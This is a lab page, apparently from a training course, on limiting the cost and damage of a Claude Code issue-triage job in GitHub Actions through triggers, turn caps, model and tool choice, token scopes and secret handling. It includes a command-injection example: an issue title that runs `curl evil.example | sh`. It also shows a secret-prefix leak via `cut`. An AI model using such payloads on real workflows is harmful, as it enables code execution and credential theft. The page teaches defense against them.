---
title: A CI agent costs what its trigger, turn cap, model and tools allow
topics: [claude-code, ai-agents]
minutes: 40
---

A job that asks Claude Code to label an issue should cost a fraction of a cent and take seconds. The
same job, written the way this lab's was, can cost as much as the model is willing to think about:
it starts on every issue edit and every comment, it runs on the largest model, it offers that model
every tool and no reason to stop, and the workflow around it lets it run for six hours with a token
that can rewrite the repository. Nothing is broken in the everyday sense. The workflow is simply
unbounded in every direction a cost can grow.

This lab bounds it in each of those directions, and graded separately, because each is a separate
decision: **how often it runs** (the trigger), **how long one run can go on** (turns and a timeout),
**how much each turn costs** (model, tools, output), and **how much damage a run can do**
(permissions, secrets, and untrusted text in a shell).

## What you should be able to do after this

- Choose workflow triggers and activity types so a job runs once per event that matters.
- Cap a headless run with `--max-turns` (and know `--max-budget-usd`), and read how a capped run ends.
- Pick a model and a tool list for a classification job, and get its answer as structured output.
- Give a workflow's `GITHUB_TOKEN` only the scopes it uses, and a job a timeout.
- Keep secrets and user-written text out of `run:` scripts.
- Estimate what a run cost from its JSON result, and say what that estimate is.

## The mechanism

### How often: triggers and activity types

Every event a workflow lists is a run. Events that have activity types run for **all** of them unless
`types` narrows it:

| trigger | runs when |
|---|---|
| `issues` | an issue is opened, edited, deleted, transferred, pinned, closed, reopened, assigned, labeled, milestoned… |
| `issues: types: [opened]` | an issue is opened |
| `issue_comment` | any comment on any issue or pull request is created, edited or deleted |
| `pull_request_target` | pull request activity, in the base repository's context, **with its secrets** |

A labelling job needs `opened`. Events caused by the workflow's own `GITHUB_TOKEN` do not start new
runs, which stops the simplest loops, but a person editing a typo in an issue is a paid run under
`types: [opened, edited]`. `pull_request_target` deserves separate caution: it exists to give workflows
for pull requests from forks access to secrets, which is exactly why it must never run code or prompts
from the pull request.

### How long: turns, budget and timeout

A `claude -p` run is a loop: the model answers, and if the answer calls a tool, Claude Code runs it
and asks again. By default there is **no limit** on that loop. In the lab image, the scripted model
that always asks to read one more file drove 1,186 turns in 25 seconds before the test killed it —
an instant fake model; a real one takes seconds per turn and bills every one.

- `--max-turns N` ends the run after N turns with `"subtype": "error_max_turns"`, `is_error: true`
  and exit status 1.
- `--max-budget-usd X` ends it when Claude Code's cost estimate passes X (subagents included).
- `timeout-minutes` on the job is the workflow's backstop; its default is 360.

A triage answer is one turn. With structured output (below) it takes two — the tool call and the
end of the turn — so a cap of 3 leaves room without leaving a loop.

### How much per turn: model, tools and output

The model is the largest single factor in price. Classification, labelling and short summaries are
Haiku work; this job named `--model opus`, and a job that names no model runs on the account's
default. Tools cost twice: their definitions are sent on every request, and each call is another
turn. `--dangerously-skip-permissions` offers the model every tool it has — here 21 of them, `Bash`,
`Write` and `WebFetch` included — and invites it to explore. `--tools ""` offers none.

Structured output makes the answer machine-readable and removes a turn of prose:

```sh
schema='{"type":"object","properties":{"label":{"type":"string","enum":["bug","question","lab-request"]}},"required":["label"],"additionalProperties":false}'
claude -p "Label the GitHub issue on stdin …" --model haiku --tools "" --max-turns 3 \
    --json-schema "$schema" --output-format json > out.json
jq -r '.structured_output.label' out.json
```

With `--json-schema` the model is offered exactly one tool, `StructuredOutput`, whose input is
validated against the schema, and the validated object lands in `structured_output`. The `result`
field then holds the same object as a JSON **string** — a script reading `.result` prints
`{"label":"bug"}`.

For Norboten's own triage job, measured on a real subscription run (docs/claude-code-in-norboten.md),
this shape costs $0.0028–0.0038 a run with thinking turned off.

### What the estimate is

`total_cost_usd` and `modelUsage` in the result are Claude Code's client-side estimate at list prices.
On a subscription token they are not a bill — usage counts against the plan — but they are the right
number to compare shapes of the same job, and `--max-budget-usd` uses the same estimate.

### How much damage: the workflow

- **`permissions`.** `write-all` gives the token every scope: contents, workflows, packages, releases.
  A labelling job needs `issues: write`, and `contents: read` for the checkout. A workflow without a
  `permissions` block gets the repository's default, which on many repositories is still write.
- **Secrets in `run:`.** `${{ secrets.X }}` inside a script puts the value into the script's text.
  GitHub masks exact matches in logs, but not a substring cut with `cut -c1-24`, a base64 of it, or a
  line split across outputs. Pass secrets through `env:` and never print them.
- **Event text in `run:`.** `${{ github.event.issue.title }}` is substituted before the shell starts,
  so a title of `x"; curl evil.example | sh; echo "` becomes code running with the job's token and
  secrets. Pass it through `env:` and use `"$TITLE"`, where it is data. For the model the same text is
  also untrusted: tell it so, and give it nothing it can act with.

## A failure, walked through

Replayed in the lab container (Claude Code 2.1.270, scripted models). First, how far the unbounded
script goes when the model asks forty times for "one more look" before answering:

```console
$ time (GITHUB_EVENT_PATH=ci/sample-event.json sh ci/triage.sh)
question
real	0m0.660s
$ jq -c '{num_turns, total_cost_usd, modelUsage: (.modelUsage | keys)}' /tmp/triage.json
{"num_turns":41,"total_cost_usd":0.041,"modelUsage":["claude-opus-5"]}
```

Forty-one turns on Opus, for one word. The scripted model reports a flat 100 input tokens per turn, so
that $0.041 is far below what a real run would show: a real conversation resends its whole history on
every turn. (Norboten's real lab-author run took 15 turns and 163,802 input tokens.) With the lab's
own model, which never answers at all, the script does not end:

```console
$ time (GITHUB_EVENT_PATH=ci/sample-event.json timeout 10 sh ci/triage.sh; echo "exit $?")
exit 124
real	0m10.004s
```

A turn cap alone ends the loop:

```console
$ sed -i 's/--dangerously-skip-permissions/--dangerously-skip-permissions --max-turns 3/' ci/triage.sh
$ GITHUB_EVENT_PATH=ci/sample-event.json sh ci/triage.sh; echo "exit $?"
exit 1
$ jq -c '{subtype, num_turns, is_error}' /tmp/triage.json
{"subtype":"error_max_turns","num_turns":4,"is_error":true}
```

— but the run is still Opus with every tool, and the grader says so:

```
FAIL 03_haiku_with_no_tools: The run asks for claude-opus-5.
```

The script's final form uses Haiku, no tools, a cap and a schema (above). Against a model that answers
properly:

```console
$ GITHUB_EVENT_PATH=ci/sample-event.json sh ci/triage.sh
bug
$ jq -c '{subtype, num_turns, structured_output, result}' /tmp/triage.json
{"subtype":"success","num_turns":2,"structured_output":{"label":"bug"},"result":"{\"label\":\"bug\"}"}
```

The workflow keeps its shape and loses everything unbounded:

```yaml
on:
  issues:
    types: [opened]

permissions:
  issues: write
  contents: read

concurrency:
  group: triage-${{ github.event.issue.number }}

jobs:
  triage:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
      - name: Install Claude Code
        run: curl -fsSL https://claude.ai/install.sh | bash -s 2.1.270
      - name: Triage
        env:
          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
          GH_TOKEN: ${{ github.token }}
          ISSUE: ${{ github.event.issue.number }}
        run: |
          label=$(sh ci/triage.sh)
          gh issue edit "$ISSUE" --add-label "$label"
```

The "check the token is there" step is gone rather than fixed: there is no safe way to print part of a
secret. The grader:

```
PASS 01_only_new_issues_start_the_job: Only a newly opened issue starts the job.
PASS 02_a_looping_model_is_stopped: A model that kept asking for more was stopped after 3 request(s).
PASS 03_haiku_with_no_tools: Haiku, no tools, and the label read from structured output.
     tools offered: ['StructuredOutput']
PASS 04_least_privilege_and_a_timeout: Issues write and contents read at most, and a timeout of 15 minutes or less.
PASS 05_nothing_secret_or_untrusted_in_run_scripts: Secrets and event fields reach the scripts only through env.
```

## Common wrong turns

**Capping turns and stopping there.** The loop ends; each of the three turns is still Opus with 21 tool
definitions. Caps bound the worst case; model and tools set the normal case.

**Relying on `timeout-minutes` as the cap.** Ten minutes of turns is still hundreds of paid requests.
The timeout is for a hung process, not for a model that keeps going.

**Reading `.result` after adding `--json-schema`.** It is the JSON as a string. Read
`.structured_output.label`, and give it a default for a run that ended without one.

**Quoting the expression: `echo "${{ github.event.issue.title }}"`.** The quotes are part of the script
text the expression is pasted into; a title containing `"` closes them. Only `env:` makes it data.

**`permissions: read-all` plus a step that uses a personal access token for writing.** The PAT is a
longer-lived secret with more scope than the job's own token. Grant `issues: write` to `GITHUB_TOKEN`.

**Dropping `set -eu` so the capped run "does not fail".** A run that hit its cap produced no label;
letting the script carry on labels issues with an empty string. Fail, or fall back to a label a person
will look at.

**Moving to `anthropics/claude-code-action` and assuming it is bounded.** The action passes your
`claude_args`; turn caps, model and tools are still yours to set.

## Cheat sheet

```bash
# one bounded classification
claude -p "…" --model haiku --tools "" --max-turns 3 \
  --json-schema '{"type":"object","properties":{"label":{"type":"string","enum":["bug","question"]}},"required":["label"]}' \
  --no-session-persistence --output-format json > out.json
jq -r '.structured_output.label // "question"' out.json
jq -c '{subtype, num_turns, is_error, total_cost_usd, models: (.modelUsage|keys)}' out.json

# other caps
claude -p "…" --max-budget-usd 0.50          # estimate-based, subagents included
MAX_THINKING_TOKENS=0 claude -p "…"          # no extended thinking for no-tool jobs

# is a run still going? (a job step that never ends)
timeout 300 sh ci/triage.sh; echo "exit $?"  # 124 = killed by timeout
```

```yaml
# workflow shape
on:
  issues:
    types: [opened]
permissions:
  issues: write
  contents: read
concurrency:
  group: triage-${{ github.event.issue.number }}
jobs:
  triage:
    timeout-minutes: 10
    steps:
      - env:
          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
          TITLE: ${{ github.event.issue.title }}     # data, not code
        run: printf '%s\n' "$TITLE" | sh ci/triage.sh
```

```bash
# audit a workflow for expressions pasted into shells
grep -n 'run:' -A20 .github/workflows/*.yml | grep -E '\$\{\{ *(secrets|github\.event)\.'
```

## Going deeper

Where this lab's hints send you for reading, beyond this journal. In the TUI, `h` shows a
hint's reading and `l` opens a journal section; the lab's page on the site lists the same.

- *Claude Code in a job* (topic journal `claude-code`) — What a run costs

Documentation:

- https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows
- https://code.claude.com/docs/en/cli-reference
- https://code.claude.com/docs/en/headless
- https://docs.github.com/en/actions/reference/security/secure-use

The whole subject, end to end: the topic journal *Claude Code in a job* (`claude-code`) —
the mechanism, the symptoms and their causes, exercises, and sources.

## Review

1. A workflow has `on: issues` with no types. Name three activities that start it besides opening an
   issue.

   > Any of: edited, deleted, closed, reopened, assigned, unassigned, labeled, unlabeled, pinned,
   > transferred, milestoned. Each is a run; `types: [opened]` limits it to new issues.

2. What stops a `claude -p` run whose model keeps calling tools, if the command has no caps?

   > Nothing in Claude Code: `-p` has no default turn or budget limit. Only an outside limit — the job's
   > `timeout-minutes` (360 by default) or a `timeout` command — ends it.

3. How does a run end when it reaches `--max-turns`, and why should the script notice?

   > With `subtype: error_max_turns`, `is_error: true` and exit status 1, and without an answer. A
   > script that ignores it would act on an empty label.

4. With `--tools ""` and `--json-schema`, which tools does the model see, and where is the answer?

   > Only `StructuredOutput`. The validated object is in `structured_output`; `result` holds it as a JSON
   > string.

5. Why is `--dangerously-skip-permissions` a cost problem as well as a safety problem in a labelling
   job?

   > It offers the model every tool (21 here), whose definitions are sent on every request and which
   > invite extra turns of exploration — each one billed — besides letting it act without checks.

6. What is wrong with `run: echo "token starts ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}" | cut -c1-24`?

   > The secret is pasted into the script and its first characters are printed. Log masking hides exact
   > matches, not a prefix produced by `cut`. There is no safe way to print part of a secret.

7. Why is `${{ github.event.issue.title }}` inside `run:` dangerous even when quoted, and what is the
   fix?

   > The expression is substituted into the script text before the shell parses it; a title containing
   > a quote and `$(…)` becomes code. Put it in `env:` and use `"$TITLE"`.

8. What does `total_cost_usd` in a run's JSON result measure, on an API key and on a subscription token?

   > Claude Code's client-side estimate at list prices. On an API key it approximates the bill; on a
   > subscription token usage counts against the plan instead, and the figure is for comparison only.
